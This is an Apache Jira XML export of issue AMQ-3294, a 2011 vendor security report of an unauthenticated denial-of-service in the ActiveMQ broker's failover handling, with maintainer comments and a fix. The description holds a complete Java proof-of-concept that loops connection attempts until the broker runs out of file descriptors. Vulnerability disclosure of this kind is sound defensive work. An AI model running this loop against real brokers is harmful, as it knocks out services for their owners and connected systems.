<!-- 
RSS generated by JIRA (8.20.10#820010-sha1:ace47f9899e9ee25d7157d59aa17ab06aee30d3d) at Wed Nov 12 05:55:27 UTC 2025

It is possible to restrict the fields that are returned in this document by specifying the 'field' parameter in your request.
For example, to request only the issue key and summary append 'field=key&field=summary' to the URL of your request.
-->
<rss version="0.92" >
<channel>
    <title>ASF Jira</title>
    <link>https://issues.apache.org/jira</link>
    <description>This file is an XML representation of an issue</description>
    <language>en-uk</language>    <build-info>
        <version>8.20.10</version>
        <build-number>820010</build-number>
        <build-date>22-06-2022</build-date>
    </build-info>


<item>
            <title>[AMQ-3294] ActiveMQ failover Denial of Service</title>
                <link>https://issues.apache.org/jira/browse/AMQ-3294</link>
                <project id="12311210" key="AMQ">ActiveMQ Classic</project>
                    <description>&lt;p&gt;Abusing the &apos;failover&apos; feature in ActiveMQ, an unauthenticated user can trigger a Denial of Service condition against the broker service. &lt;/p&gt;

&lt;p&gt;In detail, an attacker can issue multiple ActiveMQ openwire connection requests using the following connection string: &#8232;failover:tcp://&amp;lt;IP&amp;gt;:61616&lt;/p&gt;

&lt;p&gt;Due to the &apos;failure&apos; mechanism, all TCP connections remain active even if a valid session is not created. &lt;br/&gt;
Please note that no valid credentials have been used. &lt;/p&gt;

&lt;p&gt;After a few thousand requests, a &quot;java.net.SocketException: Too many open files&quot; exception is triggered causing the freeze/crash of the broker. Connected systems may crash as well. &lt;/p&gt;

&lt;p&gt;During my test, the attack took around 4 minutes (in a local network) and it is highly reliable. This is most likely an abuse of the &apos;failover&apos; functionality.&lt;/p&gt;

&lt;p&gt;I&apos;ve been testing version 5.2.0 and also the latest 5.5.0 release. As both releases are affected, I assume that this issue is present in other versions as well. The problem appears in the default configuration as well as with different authentication plugins enabled.&lt;/p&gt;

&lt;p&gt;Proof-Of-Concept:&lt;/p&gt;

&lt;p&gt;--------------------&lt;br/&gt;
package openwireclient;&lt;/p&gt;

&lt;p&gt;import javax.jms.*;&lt;br/&gt;
import org.apache.activemq.ActiveMQConnectionFactory;&lt;/p&gt;

&lt;p&gt;public class GoAndCrash {&lt;/p&gt;

&lt;p&gt;    private static String url = &quot;failover:tcp://&quot;;&lt;/p&gt;

&lt;p&gt;    public static void main(String[] args) throws JMSException {&lt;/p&gt;

&lt;p&gt;        System.out.println(&quot;\n--[ ActiveMQ Denial of Service PoC ]\n&quot;);&lt;/p&gt;

&lt;p&gt;        url = url.concat(args&lt;span class=&quot;error&quot;&gt;&amp;#91;0&amp;#93;&lt;/span&gt; + &quot;:&quot; + args&lt;span class=&quot;error&quot;&gt;&amp;#91;1&amp;#93;&lt;/span&gt;);&lt;br/&gt;
        int cont = 0;&lt;/p&gt;

&lt;p&gt;        while (true) {&lt;br/&gt;
            try &lt;/p&gt;
{
                System.out.println(&quot;[*] Request #&quot; + cont);
                ConnectionFactory connectionFactory = new ActiveMQConnectionFactory(&quot;invalidUser&quot;, &quot;invalidPass&quot;, url);
                Connection connection = connectionFactory.createConnection();
                cont++;
                connection.start();
            }
&lt;p&gt; catch (Exception ex) &lt;/p&gt;
{
               //do nothing
            }
&lt;p&gt;        }&lt;br/&gt;
    }&lt;br/&gt;
}&lt;br/&gt;
--------------------&lt;/p&gt;</description>
                <environment>&lt;p&gt;Linux ubuntu 2.6.32-30-generic and other Linux versions&lt;/p&gt;</environment>
        <key id="12505000">AMQ-3294</key>
            <summary>ActiveMQ failover Denial of Service</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="rajdavies">Robert Davies</assignee>
                                    <reporter username="luca.carettoni">Luca Carettoni</reporter>
                        <labels>
                            <label>security</label>
                    </labels>
                <created>Fri, 22 Apr 2011 18:44:40 +0000</created>
                <updated>Fri, 2 Dec 2011 21:37:37 +0000</updated>
                            <resolved>Fri, 2 Dec 2011 21:37:37 +0000</resolved>
                                    <version>5.2.0</version>
                    <version>5.5.0</version>
                                    <fixVersion>5.6.0</fixVersion>
                                    <component>Broker</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>0</watches>
                                                                                                                <comments>
                            <comment id="13093877" author="luca.carettoni" created="Tue, 30 Aug 2011 16:40:14 +0000"  >&lt;p&gt;After a few months, any update on this?&lt;/p&gt;

&lt;p&gt;Thanks,&lt;br/&gt;
Luca&lt;/p&gt;</comment>
                            <comment id="13094680" author="gtully" created="Wed, 31 Aug 2011 16:49:55 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/browse/AMQ-1928&quot; class=&quot;external-link&quot; rel=&quot;nofollow&quot;&gt;https://issues.apache.org/jira/browse/AMQ-1928&lt;/a&gt; helps here, it allows you to limit the number of concurrent connections. Set this to 10 and the DoS attack will fail&lt;/p&gt;</comment>
                            <comment id="13094720" author="luca.carettoni" created="Wed, 31 Aug 2011 17:47:43 +0000"  >&lt;p&gt;Gary, thanks for your follow-up!&lt;br/&gt;
Haven&apos;t tested it yet but it looks indeed as a possible workaround - at least to avoid a brutal crash.&lt;/p&gt;

&lt;p&gt;I&apos;ve just downloaded the latest stable (5.5.0) and it does not include this configuration option in any of the configuration templates. From the security standpoint, it will be great to see this transport option enabled by default with a reasonable value.&lt;/p&gt;</comment>
                            <comment id="13161866" author="rajdavies" created="Fri, 2 Dec 2011 21:37:37 +0000"  >&lt;p&gt;Fixed by revision 1209700&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>63008</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            13 years, 51 weeks, 4 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                            <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|i0ajhb:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>59429</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        </customfields>
    </item>
</channel>
</rss>